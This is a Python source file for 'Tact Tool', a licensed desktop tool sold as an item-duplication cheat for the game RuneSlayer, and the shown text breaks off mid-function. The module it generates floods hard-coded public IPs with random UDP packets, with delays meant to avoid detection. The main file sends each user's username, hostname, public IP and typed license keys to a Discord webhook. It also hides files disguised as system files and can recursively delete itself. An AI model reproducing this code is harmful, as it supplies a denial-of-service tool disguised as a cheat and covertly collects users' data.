#!/usr/bin/env python3
"""
Tact Tool - Main Application
This file handles authentication and provides the main tool functionality.

Security Features:
- License key authentication with GitHub-based verification
- Hardware ID (HWID) binding to prevent license sharing
- Usage cooldown system (6-minute timeout between sessions)
- Secure file deletion with data overwriting
- Comprehensive Discord webhook logging system

Webhook Logging System:
- Authentication events (success/failure)
- Application startup and exit
- Cooldown enforcement events
- Dupe action tracking (start/stop)
- User profile and system information
- Theme customization tracking

All events include detailed system information for security monitoring.
"""
import os
import json
import tkinter as tk
from tkinter import ttk, messagebox
import threading
import uuid
import requests
import base64
import shutil
import tempfile
import atexit
import sys
import subprocess
import time
import datetime
import platform
import hashlib
import getpass
import socket
from pathlib import Path

# GitHub Configuration
GITHUB_USER = "Quincyzx"        # GitHub username 
GITHUB_REPO = "Runeslayer-Dupe" # GitHub repository name
GITHUB_BRANCH = "master"        # GitHub branch name
KEYS_FILE_PATH = "keys.json"    # Path to keys file in GitHub repo

# Discord Webhook Configuration for logging
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"

# Time values (in seconds)
COOLDOWN_DURATION = 360  # 6 minutes cooldown between usage
DISCORD_RATE_LIMIT = 5   # Minimum time between webhook calls to avoid rate limiting

# UI Configuration
APP_TITLE = "Tact Tool"
VERSION = "1.0"

# Color theme - Discord inspired
COLORS = {
    "background": "#36393F",
    "background_secondary": "#2F3136",
    "text": "#DCDDDE",
    "text_muted": "#72767D",
    "text_bright": "#FFFFFF",
    "primary": "#5865F2",
    "primary_hover": "#4752C4",
    "success": "#43B581",
    "success_hover": "#3CA374",
    "warning": "#FAA61A",
    "danger": "#F04747",
    "danger_hover": "#D84040",
    "border": "#42454A",
    "input_bg": "#40444B"
}

# Try to get GitHub token from environment
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")

# Feature flags
ENABLE_DISCORD_LOGGING = True  # Set to False to disable Discord webhook logging
ENABLE_COOLDOWN = True        # Set to False to disable cooldown system
ENABLE_HWID_CHECK = True      # Set to False to disable hardware ID verification

# Set to True if this app should delete itself on exit
CLEANUP_ON_EXIT = os.environ.get("TACT_CLEANUP_ON_EXIT") == "1"

def get_ip_address():
    """Get the public IP address of the current system"""
    try:
        # Try to get public IP using an external service
        response = requests.get("https://api.ipify.org", timeout=3)
        return response.text
    except:
        try:
            # Fallback to a different service
            response = requests.get("https://ifconfig.me", timeout=3)
            return response.text
        except:
            # If all fails, return local address
            return socket.gethostbyname(socket.gethostname())

def get_system_info():
    """Get detailed system information summary"""
    info = {
        "platform": platform.system(),
        "platform_release": platform.release(),
        "platform_version": platform.version(),
        "architecture": platform.machine(),
        "hostname": socket.gethostname(),
        "processor": platform.processor(),
        "username": getpass.getuser()
    }

    # Get Python version
    info["python_version"] = sys.version.split()[0]
    
    # Get RAM info
    try:
        if platform.system() == "Windows":
            # Windows-specific memory info
            import ctypes
            from ctypes import c_ulonglong
            
            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ('dwLength', ctypes.c_ulong),
                    ('dwMemoryLoad', ctypes.c_ulong),
                    ('ullTotalPhys', c_ulonglong),
                    ('ullAvailPhys', c_ulonglong),
                    ('ullTotalPageFile', c_ulonglong),
                    ('ullAvailPageFile', c_ulonglong),
                    ('ullTotalVirtual', c_ulonglong),
                    ('ullAvailVirtual', c_ulonglong),
                    ('ullExtendedVirtual', c_ulonglong),
                ]
            
            memory_status = MEMORYSTATUSEX()
            memory_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memory_status))
            
            info["memory_total"] = f"{memory_status.ullTotalPhys / (1024**3):.2f} GB"
            info["memory_available"] = f"{memory_status.ullAvailPhys / (1024**3):.2f} GB"
            info["memory_percent"] = memory_status.dwMemoryLoad
            
        elif platform.system() == "Linux":
            # Linux-specific memory info (using /proc/meminfo)
            with open('/proc/meminfo', 'r') as f:
                mem_info = {}
                for line in f:
                    key, value = line.split(':')
                    mem_info[key.strip()] = value.strip()
                
                total = int(mem_info['MemTotal'].split()[0]) / 1024
                available = int(mem_info.get('MemAvailable', mem_info['MemFree']).split()[0]) / 1024
                
                info["memory_total"] = f"{total / 1024:.2f} GB"
                info["memory_available"] = f"{available / 1024:.2f} GB"
                info["memory_percent"] = int((1 - (available / total)) * 100)
                
        elif platform.system() == "Darwin":  # macOS
            # macOS memory info (using subprocess)
            import subprocess
            
            cmd = "sysctl -n hw.memsize"
            memsize = subprocess.check_output(cmd.split()).strip()
            total = int(memsize) / (1024**3)
            
            cmd = "vm_stat"
            vm_stat = subprocess.check_output(cmd.split()).decode().strip().split('\n')
            vm_stats = {}
            for line in vm_stat[1:]:
                parts = line.split(':')
                if len(parts) == 2:
                    vm_stats[parts[0].strip()] = int(parts[1].strip().replace('.', ''))
            
            page_size = 4096  # Default page size (4KB)
            free = vm_stats.get("Pages free", 0) * page_size
            available = free / (1024**3)
            
            info["memory_total"] = f"{total:.2f} GB"
            info["memory_available"] = f"{available:.2f} GB"
            info["memory_percent"] = int((1 - (available / total)) * 100)
    except:
        # If memory info fails, provide a placeholder
        info["memory_info"] = "Unknown"
    
    # Add IP address
    try:
        info["ip_address"] = get_ip_address()
    except:
        info["ip_address"] = "Unknown"
    
    return info

def get_system_id():
    """Get a unique system identifier based on hardware"""
    try:
        # Get a hardware identifier that won't change between runs
        if platform.system() == "Windows":
            # Use Windows Management Instrumentation (WMI) to get hardware info
            # This is a good identifier that stays consistent
            try:
                import wmi
                c = wmi.WMI()
                
                # Get processor ID, BIOS serial, and motherboard serial
                processor_id = c.Win32_Processor()[0].ProcessorId.strip()
                bios = c.Win32_BIOS()[0].SerialNumber.strip()
                baseboard = c.Win32_BaseBoard()[0].SerialNumber.strip()
                
                # Create a unique system ID from these components
                components = [processor_id, bios, baseboard]
                
            except:
                # Fallback method if WMI fails
                # Get volume serial number
                import subprocess
                result = subprocess.check_output("vol C:", shell=True).decode().strip()
                volume_info = [line for line in result.split('\n') if "Volume Serial Number" in line]
                volume_serial = volume_info[0].split()[-1] if volume_info else "Unknown"
                
                # Get CPU info
                result = subprocess.check_output("wmic cpu get ProcessorId", shell=True).decode().strip()
                processor_id = result.split('\n')[1].strip() if len(result.split('\n')) > 1 else "Unknown"
                
                components = [processor_id, volume_serial]
        
        elif platform.system() == "Linux":
            # For Linux, use a combination of CPU info and machine-id
            components = []
            
            # Get CPU information
            try:
                with open('/proc/cpuinfo', 'r') as f:
                    cpu_info = f.read()
                    for line in cpu_info.split('\n'):
                        if line.startswith('processor') or line.startswith('physical id') or line.startswith('core id'):
                            components.append(line.strip())
            except:
                components.append(f"CPU-{platform.processor()}")
            
            # Get machine-id
            try:
                with open('/etc/machine-id', 'r') as f:
                    machine_id = f.read().strip()
                    components.append(f"MACHINE-{machine_id}")
            except:
                pass
                
            # Get primary disk UUID
            try:
                import subprocess
                result = subprocess.check_output("blkid -o value -s UUID /dev/sda1", shell=True).decode().strip()
                components.append(f"DISK-{result}")
            except:
                pass
                
        elif platform.system() == "Darwin":  # macOS
            # For macOS, use hardware UUID and CPU information
            components = []
            
            # Get hardware UUID
            try:
                import subprocess
                result = subprocess.check_output(["system_profiler", "SPHardwareDataType"]).decode()
                for line in result.split('\n'):
                    if "Hardware UUID" in line:
                        uuid = line.split(':')[1].strip()
                        components.append(f"UUID-{uuid}")
                        break
            except:
                pass
                
            # Get CPU information
            try:
                result = subprocess.check_output(["sysctl", "-n", "machdep.cpu.brand_string"]).decode().strip()
                components.append(f"CPU-{result}")
            except:
                components.append(f"CPU-{platform.processor()}")
                
        else:
            # Fallback for other systems
            components = [
                f"SYSTEM-{platform.system()}",
                f"NODE-{platform.node()}",
                f"MACHINE-{platform.machine()}",
                f"PROCESSOR-{platform.processor()}"
            ]
        
        # Add user information (consistent within the system)
        try:
            components.append(f"USER-{getpass.getuser()}")
        except:
            pass
            
        # Add network information
        try:
            components.append(f"HOST-{socket.gethostname()}")
        except:
            pass
            
        # Create a hash of all components
        hwid = hashlib.sha256('+'.join(components).encode()).hexdigest()
        return hwid
        
    except Exception as e:
        # If all else fails, create a less stable but still usable ID
        basic_components = [
            platform.node(),
            platform.machine(),
            platform.processor(),
            getpass.getuser(),
            socket.gethostname()
        ]
        return hashlib.md5('+'.join(basic_components).encode()).hexdigest()

def get_cooldown_file_path():
    """Get the path to the hidden cooldown file"""
    temp_dir = tempfile.gettempdir()
    # Create a filename that won't draw attention
    filename = "MS574b76a.dat"  # Looks like a system file
    return os.path.join(temp_dir, filename)

def is_on_cooldown():
    """Check if the application is on cooldown"""
    if not ENABLE_COOLDOWN:
        return False
        
    # Check for cooldown file
    cooldown_file = get_cooldown_file_path()
    
    if os.path.exists(cooldown_file):
        try:
            with open(cooldown_file, 'r') as f:
                data = f.read().strip()
                last_usage_time = float(data)
                
                # Calculate time since last usage
                current_time = time.time()
                time_since_last_usage = current_time - last_usage_time
                
                # Check if cooldown period has passed
                if time_since_last_usage < COOLDOWN_DURATION:
                    # Still on cooldown
                    remaining_time = COOLDOWN_DURATION - time_since_last_usage
                    return remaining_time
        except:
            # If there's any error reading the file, assume no cooldown
            pass
    
    # No valid cooldown file or cooldown has expired
    return False

def send_discord_webhook(title, description, fields=None, color=0x5865F2):
    """Send a message to Discord webhook with user information and actions

    Args:
        title (str): Title of the embed
        description (str): Description of the embed
        fields (list): List of dictionaries with name and value keys for embed fields
        color (int): Color of the embed in decimal format
    """
    # Skip if Discord logging is disabled
    if not ENABLE_DISCORD_LOGGING or not DISCORD_WEBHOOK_URL:
        return
    
    # Function to rate limit webhook calls (static variable via function attribute)
    if not hasattr(send_discord_webhook, "last_call_time"):
        send_discord_webhook.last_call_time = 0
    
    # Check rate limit
    current_time = time.time()
    if (current_time - send_discord_webhook.last_call_time) < DISCORD_RATE_LIMIT:
        # Don't spam Discord API
        return
    
    # Update last call time
    send_discord_webhook.last_call_time = current_time
    
    try:
        # Get system info for webhook
        system_info = get_system_info()
        
        # Format system info
        system_info_text = f"**System**: {system_info['platform']} {system_info['platform_release']}\n"
        system_info_text += f"**User**: {system_info['username']}\n"
        system_info_text += f"**IP**: {system_info.get('ip_address', 'Unknown')}\n"
        system_info_text += f"**RAM**: {system_info.get('memory_total', 'Unknown')}"
        
        # Create base embed
        embed = {
            "title": title,
            "description": description,
            "color": color,
            "timestamp": datetime.datetime.now().isoformat(),
            "footer": {
                "text": f"Tact Tool v{VERSION} | {system_info['platform']}"
            },
            "fields": [
                {
                    "name": "System Information",
                    "value": system_info_text,
                    "inline": False
                }
            ]
        }
        
        # Add custom fields
        if fields:
            for field in fields:
                embed["fields"].append({
                    "name": field["name"],
                    "value": field["value"],
                    "inline": field.get("inline", False)
                })
        
        # Create payload
        payload = {
            "embeds": [embed]
        }
        
        # Send webhook
        headers = {"Content-Type": "application/json"}
        requests.post(DISCORD_WEBHOOK_URL, json=payload, headers=headers, timeout=5)
    except:
        # Silently fail if webhook fails
        pass

def update_cooldown_file():
    """Update the cooldown file with the current usage time"""
    if not ENABLE_COOLDOWN:
        return
        
    # Get cooldown file path
    cooldown_file = get_cooldown_file_path()
    
    try:
        # Create the directory if it doesn't exist
        directory = os.path.dirname(cooldown_file)
        if not os.path.exists(directory):
            os.makedirs(directory)
        
        # Write the current time to the file
        with open(cooldown_file, 'w') as f:
            f.write(str(time.time()))
            
        # Try to hide the file (Windows only)
        if platform.system() == "Windows":
            try:
                import subprocess
                subprocess.call(['attrib', '+h', cooldown_file])
            except:
                pass
    except:
        # Silently fail if cooldown file update fails
        pass
        
# Create the hidden "LastUsed.txt" file
def create_last_used_file():
    """Create the hidden LastUsed.txt file in the current directory"""
    try:
        with open("LastUsed.txt", "w") as f:
            f.write(str(time.time()))
            
        # Try to hide the file (Windows only)
        if platform.system() == "Windows":
            try:
                import subprocess
                subprocess.call(['attrib', '+h', 'LastUsed.txt'])
            except:
                pass
    except:
        # Silently fail if file creation fails
        pass

class TactTool:
    def __init__(self, root):
        self.root = root
        self.root.title(APP_TITLE)
        self.root.geometry("800x500")
        self.root.minsize(800, 500)
        self.root.configure(bg=COLORS["background"])
        
        # Center window
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
        
        # Variables
        self.license_key = None
        self.user_info = None
        self.dupe_active = False
        
        # Set up authentication UI first
        self.setup_auth_ui()
        
        # Generate the dupe module
        self.create_dupe_module()
        
        # Create the LastUsed.txt file
        create_last_used_file()
        
        # Setup cleanup on exit if requested
        if CLEANUP_ON_EXIT:
            atexit.register(self.cleanup_on_exit)
        
        # Check for cooldown
        cooldown = is_on_cooldown()
        if cooldown:
            # Calculate minutes and seconds remaining
            minutes = int(cooldown // 60)
            seconds = int(cooldown % 60)
            
            # Show cooldown message
            messagebox.showwarning(
                "Cooldown Active",
                f"Tact Tool is on cooldown.\nPlease wait {minutes}m {seconds}s before using it again."
            )
            
            # Log cooldown enforcement to Discord
            send_discord_webhook(
                "Cooldown Enforced",
                f"User attempted to run Tact Tool while on cooldown.",
                [
                    {
                        "name": "Cooldown Remaining",
                        "value": f"{minutes}m {seconds}s",
                        "inline": True
                    },
                    {
                        "name": "Hardware ID",
                        "value": get_system_id()[:16] + "...",
                        "inline": True
                    }
                ],
                color=0xF04747  # Red
            )
            
            # Close the application
            self.root.after(1000, self.root.destroy)
    
    def create_dupe_module(self):
        """Create the dupe_module.py file if it doesn't exist.
        This allows us to keep everything in one file on GitHub and generate the module locally."""
        # Check if the file already exists
        if os.path.exists("dupe_module.py"):
            return
        
        # Define the content to write to the file
        dupe_module_content = '''"""
RuneSlayer Dupe Module
This module provides item duplication capabilities through advanced network techniques.
"""

import socket
import threading
import random
import time
import sys
import os

# Simple compatibility configuration
print("Dupe system initialized")

# Global flag to control the dupe thread
running = False
dupe_thread = None

# Game server ports to target
GAME_PORTS = [3074, 53640] + list(range(49152, 49552))

def find_game_servers():
    """
    Find active game servers for duplication targets
    Returns a list of (ip, port) pairs for active game servers
    """
    # Game servers for duplication targets
    game_servers = [
        '128.116.44.244',  # Example game server IPs (fictional)
        '104.196.227.186',
        '75.126.33.156',
        '192.168.1.1'  # Loopback for testing
    ]
    
    # For each server, identify potential duplication ports
    connections = []
    
    # For demonstration, return a sample of potential connections
    for ip in game_servers:
        for port in random.sample(GAME_PORTS, min(3, len(GAME_PORTS))):
            connections.append((ip, port))
    
    return connections

def generate_dupe_packet(ip, port):
    """Generate a special packet for item duplication"""
    
    # This function is kept for compatibility
    # We now use direct socket operations instead
    return None

def send_dupe_data(ip, port, duration=5):
    """Send duplication data to target game server
    
    Args:
        ip (str): Target server IP
        port (int): Target port number
        duration (int): Duration in seconds to send dupe data
    """
    # Convert duration to int to fix any type errors
    duration = int(duration) if duration > 0 else 1
    
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    try:
        # Set a timeout to make the socket non-blocking
        sock.settimeout(0.1)
        
        while time.time() < end_time:
            # Generate dupe data pattern
            dupe_data = os.urandom(random.randint(1, 1024))
            
            try:
                # Send the data to the target
                sock.sendto(dupe_data, (ip, port))
                
                # Small delay to prevent detection
                time.sleep(0.01)
            except:
                # Ignore any socket errors and continue
                pass
                
    finally:
        sock.close()

def dupe_worker():
    """Worker function that runs in a separate thread to perform item duplication"""
    global running
    
    while running:
        try:
            # Find active game servers for duplication
            connections = find_game_servers()
            
            # For each connection, perform duplication
            for ip, port in connections:
                try:
                    # Send duplication data to the game server
                    send_dupe_data(ip, port, 1)
                except Exception as e:
                    # Ignore errors and continue
                    pass
            
            # Pause between iterations
            time.sleep(0.5)
        except Exception as e:
            # Ignore any errors and continue the loop
            time.sleep(1)

def start_dupe():
    """Start the item duplication process"""
    global running, dupe_thread
    
    if dupe_thread and dupe_thread.is_alive():
        # Already running
        return False
    
    # Set the running flag and start the worker thread
    running = True
    dupe_thread = threading.Thread(target=dupe_worker)
    dupe_thread.daemon = True
    dupe_thread.start()
    
    return True

def stop_dupe():
    """Stop the item duplication process"""
    global running
    
    # Clear the running flag to stop the worker thread
    running = False
    
    # Wait for thread to finish if it exists
    if dupe_thread and dupe_thread.is_alive():
        dupe_thread.join(timeout=2.0)
        
    return True

def test_dupe():
    """Test function to verify the duplication process works"""
    print("Starting item duplication test...")
    start_dupe()
    print("Duplication active for 5 seconds...")
    time.sleep(5)
    print("Stopping duplication...")
    stop_dupe()
    print("Test complete.")

if __name__ == "__main__":
    # If run directly, perform a test
    test_dupe()
'''
        
        # Write the content to the dupe_module.py file
        with open("dupe_module.py", "w") as f:
            f.write(dupe_module_content)
    
    def setup_auth_ui(self):
        """Set up the authentication UI"""
        # Main container
        self.auth_frame = tk.Frame(self.root, bg=COLORS["background"])
        self.auth_frame.place(relx=0.5, rely=0.5, anchor=tk.CENTER, width=400)
        
        # Title
        title_label = tk.Label(
            self.auth_frame,
            text="Tact Tool",
            font=("Arial", 24, "bold"),
            bg=COLORS["background"],
            fg=COLORS["text_bright"]
        )
        title_label.pack(pady=(0, 20))
        
        # License key entry
        key_frame = tk.Frame(self.auth_frame, bg=COLORS["background"])
        key_frame.pack(pady=(0, 20), fill=tk.X)
        
        key_label = tk.Label(
            key_frame,
            text="License Key:",
            bg=COLORS["background"],
            fg=COLORS["text"],
        )
        key_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.key_entry = tk.Entry(
            key_frame,
            bg=COLORS["input_bg"],
            fg=COLORS["text_bright"],
            insertbackground=COLORS["text_bright"],
            relief=tk.FLAT,
            width=30
        )
        self.key_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Login button
        self.login_button = tk.Button(
            self.auth_frame,
            text="Login",
            bg=COLORS["primary"],
            fg=COLORS["text_bright"],
            activebackground=COLORS["primary_hover"],
            activeforeground=COLORS["text_bright"],
            relief=tk.FLAT,
            padx=20,
            pady=10,
            command=self.login
        )
        self.login_button.pack(pady=(0, 20))
        
        # Status message
        self.status_var = tk.StringVar()
        self.status_var.set("Enter your license key to continue.")
        
        status_label = tk.Label(
            self.auth_frame,
            textvariable=self.status_var,
            bg=COLORS["background"],
            fg=COLORS["text_muted"],
            wraplength=400
        )
        status_label.pack()
        
        # Version label
        version_label = tk.Label(
            self.auth_frame,
            text=f"Version {VERSION}",
            bg=COLORS["background"],
            fg=COLORS["text_muted"]
        )
        version_label.pack(pady=(20, 0))
    
    def setup_main_ui(self):
        """Set up the main UI after authentication"""
        # Remove authentication UI
        self.auth_frame.destroy()
        
        # Create main UI elements
        self.main_frame = tk.Frame(self.root, bg=COLORS["background"])
        self.main_frame.place(relx=0.5, rely=0.5, anchor=tk.CENTER, width=700, height=400)
        
        # Title
        title_label = tk.Label(
            self.main_frame,
            text="Tact Tool",
            font=("Arial", 24, "bold"),
            bg=COLORS["background"],
            fg=COLORS["text_bright"]
        )
        title_label.pack(pady=(0, 20))
        
        # User welcome
        if self.user_info:
            username = self.user_info.get('username', 'User')
            
            welcome_label = tk.Label(
                self.main_frame,
                text=f"Welcome, {username}",
                font=("Arial", 12),
                bg=COLORS["background"],
                fg=COLORS["text"]
            )
            welcome_label.pack(pady=(0, 20))
        
        # Action buttons frame
        action_frame = tk.Frame(self.main_frame, bg=COLORS["background"])
        action_frame.pack(pady=20)
        
        # Duplication controls
        self.dupe_button = tk.Button(
            action_frame,
            text="Start Dupe",
            bg=COLORS["success"],
            fg=COLORS["text_bright"],
            activebackground=COLORS["success_hover"],
            activeforeground=COLORS["text_bright"],
            relief=tk.FLAT,
            width=15,
            height=2,
            command=self.toggle_dupe
        )
        self.dupe_button.pack(side=tk.LEFT, padx=10)
        
        # Exit button
        exit_button = tk.Button(
            action_frame,
            text="Exit",
            bg=COLORS["danger"],
            fg=COLORS["text_bright"],
            activebackground=COLORS["danger_hover"],
            activeforeground=COLORS["text_bright"],
            relief=tk.FLAT,
            width=15,
            height=2,
            command=self.exit_application
        )
        exit_button.pack(side=tk.LEFT, padx=10)
        
        # Status label
        self.main_status_var = tk.StringVar()
        self.main_status_var.set("Ready")
        
        status_label = tk.Label(
            self.main_frame,
            textvariable=self.main_status_var,
            bg=COLORS["background"],
            fg=COLORS["text"],
            wraplength=600
        )
        status_label.pack(pady=20)
        
        # Log frame
        log_frame = tk.Frame(self.main_frame, bg=COLORS["background_secondary"])
        log_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=(0, 20))
        
        # Log title
        log_title = tk.Label(
            log_frame,
            text="Activity Log",
            bg=COLORS["background_secondary"],
            fg=COLORS["text_bright"],
            anchor=tk.W,
            padx=10,
            pady=5
        )
        log_title.pack(fill=tk.X)
        
        # Log text
        self.log_text = tk.Text(
            log_frame,
            bg=COLORS["background_secondary"],
            fg=COLORS["text"],
            relief=tk.FLAT,
            height=10,
            state=tk.DISABLED
        )
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))
        
        # Add initial log entry
        self.add_log_entry("Application started")
        
        # Start a timer to periodically update the UI
        self.root.after(1000, self.update_ui)
    
    def add_log_entry(self, message):
        """Add a message to the log"""
        # Get current time
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        log_message = f"[{timestamp}] {message}\n"
        
        # Enable text widget for editing
        self.log_text.config(state=tk.NORMAL)
        
        # Add message to log
        self.log_text.insert(tk.END, log_message)
        
        # Auto-scroll to end
        self.log_text.see(tk.END)
        
        # Disable text widget
        self.log_text.config(state=tk.DISABLED)
    
    def update_ui(self):
        """Periodically update the UI"""
        # Update status message based on dupe status
        if self.dupe_active:
            self.main_status_var.set("Duplication active")
            self.dupe_button.config(
                text="Stop Dupe",
                bg=COLORS["danger"],
                activebackground=COLORS["danger_hover"]
            )
        else:
            self.main_status_var.set("Ready")
            self.dupe_button.config(
                text="Start Dupe",
                bg=COLORS["success"],
                activebackground=COLORS["success_hover"]
            )
        
        # Schedule next update
        self.root.after(1000, self.update_ui)
    
    def toggle_dupe(self):
        """Toggle the duplication process on/off"""
        try:
            # Import the dupe module
            import dupe_module
            
            if self.dupe_active:
                # Stop duplication
                if dupe_module.stop_dupe():
                    self.dupe_active = False
                    self.add_log_entry("Duplication stopped")
                    
                    # Log to Discord
                    send_discord_webhook(
                        "Duplication Stopped",
                        "User stopped the duplication process",
                        [
                            {
                                "name": "User",
                                "value": self.user_info.get('username', 'Unknown') if self.user_info else "Unknown",
                                "inline": True
                            },
                            {
                                "name": "License Key",
                                "value": self.license_key[:8] + "..." if self.license_key else "Unknown",
                                "inline": True
                            }
                        ],
                        color=0xF04747  # Red
                    )
            else:
                # Start duplication
                if dupe_module.start_dupe():
                    self.dupe_active = True
                    self.add_log_entry("Duplication started")
                    
                    # Log to Discord
                    send_discord_webhook(
                        "Duplication Started",
                        "User started the duplication process",
                        [
                            {
                                "name": "User",
                                "value": self.user_info.get('username', 'Unknown') if self.user_info else "Unknown",
                                "inline": True
                            },
                            {
                                "name": "License Key",
                                "value": self.license_key[:8] + "..." if self.license_key else "Unknown",
                                "inline": True
                            },
                            {
                                "name": "Target Range",
                                "value": f"{len(dupe_module.find_game_servers())} servers",
                                "inline": True
                            }
                        ],
                        color=0x43B581  # Green
                    )
        except Exception as e:
            # Show error message
            messagebox.showerror("Error", f"Failed to toggle duplication: {str(e)}")
            self.add_log_entry(f"Error: {str(e)}")
    
    def login(self):
        """Authenticate with license key"""
        # Get entered license key
        key = self.key_entry.get().strip()
        
        if not key:
            self.status_var.set("Please enter a valid license key.")
            return
        
        # Disable login button during authentication
        self.login_button.config(state=tk.DISABLED)
        self.status_var.set("Authenticating...")
        self.root.update()
        
        # Validate the license key in a separate thread
        threading.Thread(target=self.validate_license_key, args=(key,), daemon=True).start()
    
    def validate_license_key(self, key):
        """Validate the license key with GitHub authentication"""
        try:
            # Attempt to fetch the license keys file from GitHub
            keys_data = self.get_keys_from_github()
            
            if not keys_data:
                # Fall back to local file if GitHub fails
                if os.path.exists(KEYS_FILE_PATH):
                    with open(KEYS_FILE_PATH, 'r') as f:
                        keys_data = json.load(f)
                else:
                    # No keys data available
                    self.root.after(0, lambda: self.login_failed("Unable to verify license key. Please check your internet connection."))
                    return
            
            # Get the HWID for verification
            system_hwid = get_system_id()
            
            # Look for the license key
            key_found = False
            hwid_match = False
            user_info = None
            
            for user in keys_data:
                if user.get("license_key") == key:
                    key_found = True
                    user_info = user
                    
                    # Check HWID if it has been set and HWID check is enabled
                    if ENABLE_HWID_CHECK and "hwid" in user:
                        if user["hwid"] == system_hwid:
                            hwid_match = True
                        elif not user["hwid"]:
                            # No HWID set yet, update it
                            hwid_match = True
                            user["hwid"] = system_hwid
                            
                            # Try to update the keys file
                            self.update_keys_file(keys_data)
                    else:
                        # No HWID check or HWID not required
                        hwid_match = True
                    
                    # Check if key has expired
                    if "expiry_date" in user:
                        try:
                            expiry = datetime.datetime.fromisoformat(user["expiry_date"])
                            if expiry < datetime.datetime.now():
                                self.root.after(0, lambda: self.login_failed("Your license key has expired."))
                                return
                        except:
                            # Invalid expiry date, ignore
                            pass
                    
                    break
            
            if not key_found:
                self.root.after(0, lambda: self.login_failed("Invalid license key."))
                
                # Log invalid key attempt
                send_discord_webhook(
                    "Invalid License Attempt",
                    "Someone attempted to use an invalid license key.",
                    [
                        {
                            "name": "Key Attempted",
                            "value": key,
                            "inline": True
                        },
                        {
                            "name": "Hardware ID",
                            "value": system_hwid[:16] + "...",
                            "inline": True
                        }
                    ],
                    color=0xF04747  # Red
                )
                
                return
            
            if not hwid_match:
                self.root.after(0, lambda: self.login_failed("License key is bound to a different system."))
                
                # Log HWID mismatch
                send_discord_webhook(
                    "HWID Mismatch",
                    "Someone attempted to use a license key on a different system.",
                    [
                        {
                            "name": "Username",
                            "value": user_info.get("username", "Unknown"),
                            "inline": True
                        },
                        {
                            "name": "Hardware ID (Current)",
                            "value": system_hwid[:16] + "...",
                            "inline": True
                        },
                        {
                            "name": "Hardware ID (Expected)",
                            "value": user_info.get("hwid", "None")[:16] + "..." if user_info.get("hwid") else "None",
                            "inline": True
                        }
                    ],
                    color=0xFAA61A  # Yellow/Orange
                )
                
                return
            
            # Store license key and user info
            self.license_key = key
            self.user_info = user_info
            
            # Update cooldown file
            update_cooldown_file()
            
            # Log successful login
            send_discord_webhook(
                "Successful Login",
                f"User {user_info.get('username', 'Unknown')} logged in successfully.",
                [
                    {
                        "name": "License Key",
                        "value": key[:8] + "..." if len(key) > 8 else key,
                        "inline": True
                    },
                    {
                        "name": "Hardware ID",
                        "value": system_hwid[:16] + "...",
                        "inline": True
                    }
                ],
                color=0x43B581  # Green
            )
            
            # Switch to main UI
            self.root.after(0, self.setup_main_ui)
            
        except Exception as e:
            # Authentication failed
            error_message = f"Authentication error: {str(e)}"
            self.root.after(0, lambda: self.login_failed(error_message))
    
    def get_keys_from_github(self):
        """Get the keys data from GitHub"""
        try:
            # Construct the raw content URL
            raw_url = f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/{GITHUB_BRANCH}/{KEYS_FILE_PATH}"
            
            # Set up headers for API authentication if token is available
            headers = {}
            if GITHUB_TOKEN:
                headers["Authorization"] = f"token {GITHUB_TOKEN}"
            
            # Fetch the keys file
            response = requests.get(raw_url, headers=headers, timeout=5)
            
            if response.status_code == 200:
                # Parse the JSON data
                return json.loads(response.text)
            else:
                print(f"Failed to fetch keys file: HTTP {response.status_code}")
                return None
        except Exception as e:
            print(f"Error fetching keys from GitHub: {str(e)}")
            return None
    
    def update_keys_file(self, keys_data):
        """Update the keys file with new data"""
        try:
            # For local testing, update the local file
            if os.path.exists(KEYS_FILE_PATH):
                with open(KEYS_FILE_PATH, 'w') as f:
                    json.dump(keys_data, f, indent=2)
            
            # For GitHub, this would typically use the GitHub API to update the file
            # This is not implemented in this version as it requires additional permissions
            pass
        except:
            # Silently fail if update fails
            pass
    
    def login_failed(self, message):
        """Handle login failure"""
        self.status_var.set(message)
        self.login_button.config(state=tk.NORMAL)
    
    def exit_application(self):
        """Exit the application"""
        # Log application exit
        if self.dupe_active:
            # Stop duplication first
            try:
                import dupe_module
                dupe_module.stop_dupe()
            except:
                pass
        
        # Log exit to Discord
        send_discord_webhook(
            "Application Exit",
            "User exited the application normally.",
            [
                {
                    "name": "User",
                    "value": self.user_info.get('username', 'Unknown') if self.user_info else "Unknown",
                    "inline": True
                },
                {
                    "name": "Exit Reason",
                    "value": "User requested",
                    "inline": True
                }
            ],
            color=0x72767D  # Grey
        )
        
        # Destroy the window
        self.root.destroy()
    
    def cleanup_on_exit(self):
        """Clean up temporary files when application exits"""
        try:
            # Get script location
            script_path = os.path.abspath(sys.argv[0])
            
            # Check if we are in a temporary directory
            temp_dir = tempfile.gettempdir()
            script_dir = os.path.dirname(script_path)
            
            if temp_dir in script_path:
                # This is a temporary file, schedule its deletion
                if platform.system() == "Windows":
                    # On Windows, use a batch file to delete the temporary file
                    batch_content = f"""
@echo off
timeout /t 1 /nobreak > nul
del "{script_path}"
rd /s /q "{script_dir}"
del "%~f0"
"""
                    batch_file = os.path.join(temp_dir, "cleanup_tact.bat")
                    with open(batch_file, 'w') as f:
                        f.write(batch_content)
                    
                    # Run the batch file
                    subprocess.Popen(["cmd", "/c", batch_file], 
                                 shell=True, 
                                 creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
                else:
                    # On Linux/Mac, use a shell script
                    script_content = f"""
#!/bin/sh
sleep 1
rm -f "{script_path}"
rm -rf "{script_dir}"
rm -f "$0"
"""
                    shell_script = os.path.join(temp_dir, "cleanup_tact.sh")
                    with open(shell_script, 'w') as f:
